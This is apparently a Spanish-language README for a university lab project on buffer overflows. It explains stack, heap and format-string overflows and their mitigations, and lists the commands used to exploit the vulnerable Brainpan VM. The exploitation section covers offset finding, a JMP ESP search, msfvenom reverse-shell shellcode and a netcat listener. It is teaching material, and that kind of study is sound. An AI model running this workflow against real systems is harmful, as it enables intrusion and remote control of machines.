
<h1 align="center">BufferOverflow</h1>
<p align="center">
  <b>Integrantes</b>
</p>

<p align="center">
  Huber Steven Arroyave Rojas <br>
  Assandry Enrique Barón Rodríguez
</p>

<p align="center">
  <b>Tutor:</b>
</p>

<p align="center">
  Henry Alberto Arcila Ramírez <br>
  Danny Álexandro Múnera Ramírez
<br>
 </p>

 <p align="center">
  Sistemas Operativos <br>
  Departamento de Ingeniería de Sistemas <br>
  Facultad de Ingeniería <br>
  Universidad de Antioquia <br>
  2025
</p>

<h2 align="center">Descripción del proyecto y su propósito</h2>

<p>
  <strong>Drescripcion del proyecto:</strong> <br>
  <br>
  El desbordamiento de buffer pasa cuando un programa escribe más datos de los que puede almacenar en un área de la memoria (buffer), ocasionando que se sobreescriban otras partes de la memoria adyacente. Para explicar mejor esto, es como si se estuviera metiendo más ropa de la que cabe en una maleta y al final, algunas cosas van a terminar fuera de lugar. Eso es lo que sucede con el desbordamiento de buffer. Esto, ocasiona que se generen errores o incluso ataques maliciosos, los cuales pueden ocasionar algún fallo en el sistema o escalar los privilegios, otorgando al atacante control no autorizado sobre el sistema comprometido.
A pesar de que hoy en día existen diferentes medidas de protección incorporadas en los sistemas operativos modernos, todavía existen varios sistemas que siguen siendo vulnerables, debido al código heredado que no fue diseñado con las estrictas prácticas de seguridad actuales, o a implementaciones mal gestionadas de la memoria en aplicaciones nuevas. La naturaleza de lenguajes de bajo nivel como C y C++, que permiten un manejo manual y directo de memoria, si bien ofrecen un gran control y eficiencia, también introduce un mayor riesgo de errores si no se implementan validaciones de entrada y límites de buffer adecuados.

Por ende comprender esta problemática es fundamental para desarrollar software más robusto y para defender los sistemas informáticos en un entorno digital cada vez más complejo y amenazante.

Por otra parte, el buffer overflow ha sido responsable de diferentes ataques informáticos, los cuales han sido muy perjudiciales para el tema de la informática. Un ejemplo de esto fue el gusano Morris en el año de 1998, el cual aprovechó el desbordamiento de buffer para poder propagarse y causar interrupciones masivas en la red. Este problema, lo podemos encontrar en diferentes lenguajes como C y C++, debido a que en dichos lenguajes el manejo de la memoria es manual y no existen los controles automáticos de límite. La figura 1 muestra un ejemplo de un buffer overflow en un arreglo (array) <br>

<p align="center">
  <img width="394" height="175" alt="Captura de pantalla 2025-07-16 021235" src="https://github.com/user-attachments/assets/cd99d2c4-1c97-40d7-9ca6-cadf1cfca90a" />
</p>
Para esta vulnerabilidad, existen varios tipos de ataques como el stack overflow. Esto  sucede cuando se escribe más información en la pila de la que fue reservada, ocasionando que se sobreescriba la dirección de retorno almacenada por funciones. Permitiendo que el programa pueda ser engañado, para que se redirija hacia un código malicioso, como un shellcode inyectado en el mismo buffer. 
El heap-based overflow, se produce cuando un programa escribe más datos en una región del heap, es decir, en la memoria dinámica, la cual es asignada por diferentes funciones como malloc(), lo cual puede corromper las estructuras de control, modificar los punteros y permitir la ejecución de código arbitrario. 
También encontramos el  string format vulnerability, el cual, ocurre cuando una función de formateo como el printf(), utiliza de una manera directa una entrada del usuario como cadena de formato. Ocasionando, que se afecte la integridad del programa, ya que esto, permite que se pueda leer o escribir en las direcciones de memorias arbitrarias.:
Para que estos ataques funcionen, es necesario entender cómo está organizada la memoria del sistema, principalmente en las arquitecturas como x86. Donde los registros EIP (Instruction Pointer) , el cual se encarga de controlar la ejecución de las instrucciones y ESP (Stack Pointer) que se encarga del acceso a la pila. Por lo cual, un atacante que sepa cómo funcionan dichos registros puede redirigir el flujo del programa mediante técnicas como Sleds de NOP, que son instrucciones que no hacen nada, usadas como alfombra para poder aterrizar de una forma segura en el shellcode. Offsets calculados para ubicar exactamente dónde escribir  y la sobreescritura de direcciones de retorno que es cuando se escribe más allá del final de un buffer. 
A pesar de que se han realizado grandes avances en la protección para poder evitar estos ataque, como la aleatorización del espacio de direcciones (ASLR), que es una técnica de seguridad en la cual, se aleatoriza las direcciones de la memoria, evitando que un atacante no sepa hacia dónde redirigir la ejecución, ya que las direcciones cambian cada vez que se ejecuta el programa. La prevención de la ejecución de los datos (DEP/NX bit), la cual, impide la ejecución de código áreas de la memoria, donde solo deberían contener solo datos. También está los canarios en pila (stack canaries), los cuales permiten detectar y prevenir los ataques de stack buffer overflow antes de que se pueda sobreescribir la dirección de retorno de una función. Todavía hay muchísimas aplicaciones modernas que aún contienen código vulnerable o que ejecutan bibliotecas inseguras. 
En la tabla 1, se puede ver una comparativo entre los ataques mencionados anteriormente y las mitigaciones típicas: <br>
<br>

<p align="center">
<img width="640" height="216" alt="Captura de pantalla 2025-07-16 022740" src="https://github.com/user-attachments/assets/c10d6ee3-b749-4f7b-a561-ab03020d076c" />
</p>

De acuerdo a lo visto en el curso de sistemas operativos, este proyecto se enfoca en comprender cómo las vulnerabilidades de memoria pueden ser aprovechadas para comprometer la seguridad de un sistema.
La gestión de procesos, la asignación de memoria, la ejecución de instrucciones y la protección de memoria son conceptos fundamentales, que son aplicables a la comprensión y explotación de los Buffer Overflow. Además, se analizaran las contramedidas implementadas por los sistemas operativos, como la aleatorización de espacio de direcciones (ASLR) y la protección de no ejecución (NX/DEP) para mitigar los ataque de desbordamiento de buffer.

  <strong>Drescripcion del proyecto:</strong> <br>
  <ul>
    <li><strong>Objetivo principal:</strong><br>
      Realizar un ataque de desbordamiento de buffer en un entorno controlado, para poder entender su funcionamiento y cómo prevenirlo</li>
    <li><strong>Objetivos específicos:</strong><br>
      <ul>
        <li>Investigar todo lo relacionado con los fundamentos teoricos y tecnicos del buffer overflow</li>
        <li>Simular el ataque en un entorno controlado utilizando algunas herramientas como kali Linux e Immunity Debugger.</li>
        <li>Identificar las direcciones de memoria y los offsets que puedan ser relevantes para el ataque</li>
        <li>Crear un código malicioso para poder inyectar y ejecutar el ataque</li>
        <li>Analizar y explorar diferentes soluciones para poder mitigar el riesgo de los desbordamientos de buffer, y evaluar su efectividad frente a los ataques simulados.</li>
      </ul>
    </ul>
</ul> 
A traves del siguiente enlace, se encuentra la informacion del proyecto mas detallada <a href="https://github.com/hubersteven/BufferOverflow/blob/main/Documentos/2.%20Entrega%20final/Reporte%20tecnico.pdf"> Reporte técnico</a>
</p>


<h2 align="center">Requisitos de hardware/software</h2>

<p>
  <strong>Hardware Recomendado:</strong> <br>
  
A pesar de que el Buffer Overflow es un concepto de software, para realizar su   simulación en la máquinas virtuales, se requieren de los recursos de hadware. Por lo cual los requisitos son:
  <ul>
  <li> Como minimo, se debe contar con la capacidad de virtualizacion del CPU.</li>
  <li>Se debe contar con la cantidad adecuada de RAM. para este caso, se recomienda 8 GB y  a partir de la cantidad de 16 GB es la capacidad ideal para la fluidez.</li>
  <li>Tambien, es necesario contar con espacio suficiente en el disco.</li>
  </ul>
  Con lo anterior, se previenen los problemas de rendimiento o incompatibilidad, los cuales, podrian fustrar el proceso de configuración. <br>
  <br>
  <strong>Software Requerido:</strong><br>
<br>
  Las herramientas de software necesarias son:
  <ul>
  <li>Para la virtualización es necesario utilizar una plataforma como Oracle VirtualBox, la cual permita crear y gestionar las máquinas virtuales.</li>
  <li>En cuanto a las máquinas virtuales se necesitan:
    <ul>
      <li>El Kali Linux, que es la máquina atacante y de esta se necestian las siguientes herramientas:
        <ul>
          <li>En cuanto a las herramientas de red se necesitan: 
            <ul>
             <li>El netcat</li>
              <li>El nmap</li>
              <li>El arp-scan</li>
            </ul>
          </li>
          <li>Gobuster como la herramientas de descubrimiento</li>
          <li>Las utilidades de generación de los payloads y los patrones de Metasploit Framework como: 
            <ul>
              <li>pattern_create.rb</li>
              <li>pattern_offset.rb</li>
              <li>El arp-scan</li>
            </ul>
          <li> Y el Impacket para facilitar la transferencia de archivos.</li>
        </ul>
      <li>El Brainpan, que es la máquina objetivo. Dicha maquina es vulnerable al ataque y debe contar con un enlace a su ubicación de descarga en vulnHub.</li>
      <li> El Windows 7, que es la máquina intermedia. Esta, es muy importante para poder ejecutar el depurador y algunas herramientas de análisis que son nativas de Windows donde:
        <ul>
          <li>Immunity Debugger es el depurador principal</li>
          <li>Python 2.7.1 que es necesario para los scripts del depurador</li>
          <li>además de Mona.py que es un plugin vital para la automatización de   las tareas de explotación</li>
        </ul>
      </li>
    </ul>  
  </li>
</ul>  
</p>

<h2 align="center">Instrucciones detalladas de instalación y ejecución</h2>
<p>
  En el siguiente link, se encuentra una guia paso a paso de de la instalacion y ejecucion de este laboratorio: <a    href="https://github.com/hubersteven/BufferOverflow/blob/main/Documentos/2.%20Entrega%20final/Instalaci%C3%B3n%20de%20dependencias.pdf"> Instalacion de dependencias</a> <br>
  Ademas de eso, se puede un video explicativo del laboratorio, por medio del siguiente link: <a href="https://youtu.be/wMtP92HEb90"> video Entrega Final</a>
</p>

<h2 align="center">Ejemplos de uso</h2>

<p>
  A continuacion, se presentan los principales comandos utilizados durante el proceso de explotación del buffer overflow, explicando su propósito y el momento específico en que se aplican.
  <ul>
    <li><strong>El descubrimiento y la preparación del objetivo.</strong><br>
      Estos comandos son utilizados al comienzo del proceso, con el objetivo de identificar la máquina víctima y descubrir los servicios potencialmente vulnerables.
    </li>
      <ul>
        <li><strong>Identificación de IP y Puertos.</strong><br></li>
          <ul>
            <li><pre><code>arp-scan -I eth0 --localnet</code></pre>
              Realiza un escaneo de la red local para detectar todas las direcciones IP activas. Muestra las IP asignadas a Windows 7 y Kali Linux</li>
            <li><pre><code>nmap -p- -open T5 -v -n &lt;dirección ip destino&gt;</code></pre>
              Escanea todos los puertos de la máquina objetivo. Aca se detecta que el puerto 9999 es en el que se ejecuta brainpan.exe.
            </li>
          </ul>
        <li><strong>Fuzzing Web.</strong><br></li>
          <ul>
            <li><pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://&lt;ip linux&gt;:10000/</code></pre>
              Se utiliza la herramienta gobuster para buscar las rutas ocultas en el servidor web. Esto, permite descubrir el directorio /bin/, donde se puede acceder y descargar el ejecutable brainpan.exe.</li>
          </ul>        
      </ul>
     <li><strong>La fase de fuzzing y la determinación del offset.</strong><br>
     Estos comandos permiten verificar si el programa es vulnerable y determinar cuántos bytes se necesitan para sobrescribir el EIP.</li>
       <ul>
         <li><strong>Fuzzing Básico con Netcat</strong></li>
           <ul>
            <li><pre><code>nc &lt;ip windows&gt; 9999</code></pre>
              Se conecta al brainpan en ejecución utilizando el netcat y se continúa con una cadena de caracteres de gran longitud</li>
           </ul>
         <li><strong>Generación de Patrón para Calcular Offset</strong></li>
           <ul>
            <li><pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</code></pre>
              Genera una cadena única de 1000 caracteres. La cual se envía al programa para provocar un crash que permitirá localizar exactamente dónde se sobrescribe el EIP.</li>
           </ul>
         <li><strong>Cálculo del Offset</strong></li>
           <ul>
            <li><pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q &lt;valor EIP&gt;</code></pre>
              Toma el valor hexadecimal del EIP mostrado en el crash y calcula cuántos bytes exactos se necesitan para llegar a él. Sobrescribe el EIP.</li>
           </ul>
       </ul>
     <li><strong>La explotación avanzada y la generación de shellcode.</strong><br></li>
    Una vez controlado el EIP, estos comandos permiten detectar los caracteres problemáticos, encontrar la dirección de salto, generar el shellcode y lanzar el exploit final.
       <ul>
         <li><strong>Configuración de Mona.py</strong></li>
           <ul>
            <li><pre><code>!mona config -set workingfolder C:\Users\computador1\Desktop\%p</code></pre>
              Crea un directorio de trabajo para Mona, para guardar los logs, los archivos bytearray y las comparaciones.</li>
           </ul>
         <li><strong>Generación de bytearray para identificar los badchars</strong></li>
           <ul>
            <li><pre><code>!mona bytearray -cpb "\x00"</code></pre>
              Crea una lista de todos los bytes posibles (excepto los conocidos como problemáticos o bachar como lo es el byte nulo). Esta lista se guarda en un archivo y se envía al programa para observar cuáles se corrompen en la pila.</li>
            <li><pre><code>!mona compare -f C:\Users\computador1\Desktop\_no_name\bytearray.txt</code></pre>
              Compara el contenido de la pila con la lista de badchars original e identifica los badchars adicionales que deben ser excluidos al generar el shellcode.</li>
           </ul>
         <li><strong>Búsqueda de la dirección JMP ESP</strong></li>
           <ul>
            <li><pre><code>!monafind -s “\xFF\xE4” -m brainpan.exe</code></pre>
              Busca la dirección generada que contenga la instrucción JMP ESP, luego esta dirección será usada para redirigir el flujo hacia el shellcode.</li>
           </ul>
         <li><strong>Generación del shellcode (msfvenom)</strong></li>
           <ul>
            <li><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip kali&gt; LPORT=443 --platform windows -a x86 -f c -b '\x00' EXITFUNC=thread</code></pre>
              Genera un shellcode que abre una conexión inversa desde la máquina víctima hacia Kali.</li>
           </ul>
         <li><strong>Configuración del listener (Netcat o Metasploit)</strong></li>
           <ul>
            <li><pre><code>nc -lvnp 443</code></pre>
              Inicia un listener en Kali para esperar la conexión entrante desde la máquina víctima. Si el exploit es exitoso, se obtiene una shell de la máquina comprometida.</li>
          </ul>
       </ul>
   </ul>
</p>

<h2 align="center">Créditos de autores</h2>

<p>
  
</p>
